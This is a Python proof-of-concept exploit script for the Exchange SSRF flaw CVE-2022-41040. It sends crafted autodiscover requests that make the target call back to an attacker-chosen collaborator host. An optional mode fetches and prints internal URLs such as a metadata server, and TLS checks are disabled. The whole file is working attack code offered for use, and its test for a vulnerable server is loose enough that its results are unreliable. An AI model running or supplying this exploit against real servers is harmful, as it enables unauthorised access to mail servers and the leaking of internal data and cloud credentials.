import requests
import urllib3
import random
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_subdomain():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def checker(url, collaborator, internal_url=None):
    vulnerable = False
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 pp9520',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    
    if internal_url:
        target_url = internal_url
    else:
        subdomain = generate_random_subdomain()
        target_url = f'{url}/autodiscover/autodiscover.json/v1.0/aa@{subdomain}.{collaborator}?Protocol=Autodiscoverv1'

    print(f"[DEBUG] Target URL: {target_url}")

    try:
        response = requests.get(target_url, headers=headers, verify=False)
        print(f"[DEBUG] Response: {response.status_code}, Headers: {response.headers}")

        if collaborator in str(response.headers) or response.status_code in [200, 302]:
            print(f"[#] SSRF detected! Check collaborator server for callbacks.")
            vulnerable = True

            if internal_url:
                internal_response = requests.get(internal_url, headers=headers, verify=False)
                print(f"[DEBUG] Internal URL response: {internal_response.status_code}, Body: {internal_response.text}")
                return internal_response.text

            return vulnerable
        else:
            print("[*] Not vulnerable or no callback detected.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

    return vulnerable

def main():
    import argparse
    parser = argparse.ArgumentParser(description='PoC CVE-2022-41040 - SSRF with potential data leak')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-c', '--collaborator', help='Collaborator URL', required=True)
    parser.add_argument('--internal-url', help='Internal URL (e.g., metadata server) to test SSRF', required=False)

    args = parser.parse_args()
    url = args.url
    collaborator = args.collaborator
    internal_url = args.internal_url  

    check = checker(url, collaborator, internal_url)

    if check:
        print("[#] Exploitation Successful.")
    else:
        print("[*] Exploitation Failed.")

if __name__ == "__main__":
    main()
